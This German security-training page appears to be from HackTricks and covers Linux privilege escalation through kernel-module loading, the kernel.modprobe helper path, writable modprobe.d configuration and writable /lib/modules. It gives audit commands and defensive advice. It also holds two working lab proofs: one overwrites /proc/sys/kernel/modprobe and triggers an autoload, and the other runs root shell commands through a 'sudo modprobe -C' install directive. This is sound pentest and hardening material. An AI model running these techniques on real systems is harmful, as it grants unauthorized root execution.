# Missbrauch von Kernel-Modulen und modprobe

{{#include ../../banners/hacktricks-training.md}}

## Fehlkonfigurationen bei Kernel-Modulen und dem Laden von Modulen

Die Unterstützung für Kernel-Module ist ein Bereich mit hohem Einfluss bei der Überprüfung auf Linux privilege escalation. Behandle nicht jede Meldung über unsignierte Module als allein ausnutzbar, sondern nutze sie, um praktische Fragen zu beantworten.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kann der aktuelle Benutzer Module über `sudo`, capabilities oder einen beschreibbaren Helper-Pfad laden?
- Ist das Laden von Modulen noch aktiviert?
- Ist die Durchsetzung von Modul-Signaturen deaktiviert?
- Sind Modulverzeichnisse, Moduldateien oder `modprobe.d`-Konfigurationspfade beschreibbar?<sup>[[16]](#references)</sup>
- Können Kernel-Logs gelesen werden, um zu bestätigen, was passiert ist?

Eine schnelle Triage beginnt mit den folgenden Prüfungen des Modulstatus, der Signaturen, der Protokollierung und des Modulbaums.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretation:

- `modules_disabled=1` bedeutet, dass Module weder geladen noch entladen werden können und der Wert bis zum Neustart nicht auf `0` zurückgesetzt werden kann.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` in der Kernel-Befehlszeile oder `CONFIG_MODULE_SIG_FORCE=y` erfordert gültig signierte Module; andernfalls können unsignierte Module geladen werden und den Kernel als kompromittiert markieren.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` schränkt `dmesg` nicht ein; bei `1` erfordert der Zugriff `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Schreibbare Pfade unter `/lib/modules/$(uname -r)/` sind gefährlich, da `modprobe` beim Laden von Modulen diesen Baum und dessen Abhängigkeitsdaten durchsucht.<sup>[[8]](#references)</sup>

### Laden eines Moduls und Lesen der Kernel-Ausgabe

Wenn du die legitime Berechtigung hast, ein lokales Modul zu laden, fügt `insmod` die von dir angegebene `.ko`-Datei exakt ein. Die Init-Funktion des Moduls wird als Teil des Ladevorgangs ausgeführt, und mit `printk()` geschriebene Nachrichten werden in den Kernel-Logpuffer geschrieben, der normalerweise mit `dmesg` gelesen wird.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Ein minimaler Prüfablauf verwendet `modinfo` zur Untersuchung der Metadaten, `insmod` und `rmmod` zum Laden und Entfernen eines Moduls, `lsmod` zur Bestätigung des geladenen Status und `dmesg` zur Untersuchung der Kernel-Logs.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Wenn `sudo -l` `insmod`, `modprobe` oder einen Wrapper darum erlaubt, ist dies als kritisch einzustufen: `sudo -l` listet die Berechtigungen des aufrufenden Benutzers auf, und das Laden eines Kernel-Moduls erfordert `CAP_SYS_MODULE`. Siehe [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) für direkte, auf Capabilities basierende Pfade.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Über sudo erlaubtes `insmod`

Eine sudo-Regel, die einem Benutzer die Ausführung von `insmod` erlaubt, ist nicht damit vergleichbar, einen gewöhnlichen administrativen Helfer zu erlauben. Der Initialisierungscode des Moduls wird als Teil des Einfügevorgangs ausgeführt. Daher lautet die praktische Prüfungsfrage, ob dieser Benutzer das zu ladende Modul auswählen oder verändern kann.<sup>[[3]](#references)</sup>

Der folgende allgemeine Prüfablauf wiederholt diese Prüfungen der Inspektion, des Ladens, des Zustands, der Protokolle und der Entfernung für ein Kandidatenmodul.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Wenn der Benutzer eine beliebige `.ko` bereitstellen kann, sollte die Regel bei einem autorisierten Assessment als vollständige Kompromittierung des Systems behandelt werden. Ein sichereres Vorgehensmuster besteht darin, das Laden von Modulen nicht über sudo zu delegieren. Wenn dies unvermeidbar ist, sollten der exakte Pfad, Eigentümer, Berechtigungen, die Signing-Policy und der Prozess zur Entfernung eingeschränkt werden.<sup>[[3]](#references)[[10]](#references)</sup>

Für ein harmloses Muster zum Erstellen von Modulen in einer kontrollierten Lab-Umgebung werden unten ein minimaler Quellcode und ein Makefile gezeigt. Die Form `make -C /lib/modules/$(uname -r)/build M=$PWD` folgt dem dokumentierten kbuild-Workflow des Kernels für externe Module.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Nur in einem autorisierten Labor bauen und laden; kbuild erstellt das externe Modul, und die Befehle zum Laden/Entfernen rufen die Kernelmodulschnittstellen auf.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` bezeichnet das Userspace-Hilfsprogramm, das der Kernel für Anfragen zum automatischen Laden von Modulen ausführt; dieses sysctl betrifft das automatische Laden, nicht das explizite Einfügen von Modulen. Wenn ein Angreifer den Wert auf einen beschreibbaren Pfad zu einer ausführbaren Datei ändern und eine Modulanfrage auslösen kann, wird dieses Hilfsprogramm zu einem privilegierten Code-Execution-Pfad. Wird der Wert auf eine leere Zeichenfolge gesetzt, werden Anfragen zum automatischen Laden deaktiviert; wenn `CONFIG_STATIC_USERMODEHELPER=y` gesetzt ist, wird ein nichtleerer Wert durch den einkompilierten Pfad des statischen Hilfsprogramms überschrieben.<sup>[[1]](#references)</sup>

Prüfe den aktuellen Pfad des Hilfsprogramms über die Kernel-sysctl-Schnittstelle und untersuche Eigentümer und Modus des Ziels.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Prüfe, ob sysctl, delegierte sudo-Regeln oder File-Capabilities beeinflusst werden können.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Das folgende, ausschließlich für Labs gedachte Muster ändert den Pfad des Helpers und löst eine dokumentierte Anfrage zum automatischen Laden eines Moduls aus; verwenden Sie es nur auf einem isolierten, autorisierten System.<sup>[[1]](#references)</sup>

Verwenden Sie bei aktuellen Linux-Kerneln keine unbekannte ausführbare Datei als generischen Trigger: Das automatische Laden von Modulen für benutzerdefinierte Binärformate aus älteren Versionen wurde in Linux 6.14 entfernt, während die Kernel-Dokumentation einen unbekannten Dateisystemtyp als Pfad für eine Anfrage zum automatischen Laden eines Moduls nennt.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Auf gehärteten Systemen sollte dies fehlschlagen, wenn Berechtigungen nicht privilegierte Schreibzugriffe auf `kernel.modprobe` verhindern, der Pfad des Hilfsprogramms nicht beschreibbar ist oder das automatische Laden von Modulen deaktiviert wurde.<sup>[[1]](#references)</sup>

### Beschreibbare `modprobe.d`-Konfiguration und `sudo modprobe -C`

Vor der Auflösung eines Moduls liest `modprobe` `.conf`-Dateien aus Konfigurationsverzeichnissen wie `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` und `/lib/modprobe.d` in der Reihenfolge ihrer Priorität. Eine gleichnamige Datei in einem Verzeichnis mit höherer Priorität überschreibt die Datei im Verzeichnis mit niedrigerer Priorität. Noch wichtiger ist, dass eine `install <module> <command>`-Direktive einen beliebigen Shell-Befehl **anstelle** des Einfügens dieses Moduls ausführt. Daher kann ein beschreibbarer Konfigurationspfad zur verzögerten command execution mit den Credentials eines späteren privilegierten `modprobe`-Aufrufers werden; die Signaturprüfung von Kernel-Modulen authentifiziert diesen Userspace-Befehl nicht.<sup>[[16]](#references)</sup>

Überprüfe die Verzeichnis- und Dateiberechtigungen und untersuche anschließend die effektive Konfiguration. `modprobe -n -v` ist für die Überprüfung der Auflösung sicher, da der dry-run-Modus weder das Modul einfügt noch einen `install`-/`remove`-Befehl ausführt. Bevorzuge `modprobe -c` gegenüber der veralteten Schreibweise `--showconfig`, deren Entfernung nach kmod 36 in der aktuellen kmod-Dokumentation vorgesehen ist.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Eine uneingeschränkte sudo-Regel für `modprobe` ist ausnutzbar, selbst wenn beliebige `.ko`-Dateien die Signaturprüfung nicht bestehen können: `-C` wählt ein vom Angreifer kontrolliertes Konfigurationsverzeichnis aus, aus dem ein `install`-Befehl durch den von sudo gestarteten Prozess ausgeführt werden kann.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Zur Mitigation sollte `modprobe` ohne Einschränkung der Argumente nicht über sudo gewährt werden. Außerdem sollten alle Konfigurationsverzeichnisse im Besitz von root und nicht beschreibbar sein. Unerwartete `install`-/`remove`-Direktiven sollten überprüft werden. Wenn ein vertrauenswürdiger administrativer Workflow solche Direktiven für ein Modul umgehen muss, ignoriert `modprobe --ignore-install` sie für das angegebene Modul; Abhängigkeiten können jedoch weiterhin eigene Befehle enthalten.<sup>[[8]](#references)[[16]](#references)</sup>

### Überprüfung von beschreibbarem `/lib/modules`

Beschreibbare Modulverzeichnisse können je nach späterem Aufruf von `modprobe` den Austausch von Modulen, das Einschleusen bösartiger Module oder den Missbrauch des automatischen Ladens ermöglichen. `modprobe` durchsucht `/lib/modules/$(uname -r)` und verwendet dessen Abhängigkeitsdaten beim Auflösen von Modulen.<sup>[[8]](#references)</sup>

Überprüfe beschreibbare Moduldateien sowie Abhängigkeits- und Alias-Metadaten im Modulbaum des aktiven Kernel-Releases.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Wenn du beschreibbaren Modulinhalt findest, untersuche, wie `modprobe` Abhängigkeiten auflöst und wie `modinfo` Modulmetadaten meldet.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defensive Hinweise:

- Halte `/lib/modules` im Besitz von `root:root` und für Benutzer nicht beschreibbar.<sup>[[8]](#references)</sup>
- Setze `kernel.modules_disabled=1` nach dem Booten, sofern dies betrieblich möglich ist.<sup>[[1]](#references)</sup>
- Erzwinge die Signierung von Kernel-Modulen auf Systemen, die ladbare Module benötigen.<sup>[[2]](#references)</sup>
- Überwache Schreibvorgänge in `/proc/sys/kernel/modprobe`, `/lib/modules` und den `modprobe.d`-Konfigurationsverzeichnissen sowie unerwartete Ausführungen von `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Dokumentation für /proc/sys/kernel/ — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Einrichtung zur Signierung von Kernel-Modulen — Die Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Grundlagen von Treibern — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Nachrichtenprotokollierung mit printk — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Erstellen externer Module — Die Linux-Kernel-Dokumentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge-Tag „execve-v6.14-rc1“ — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
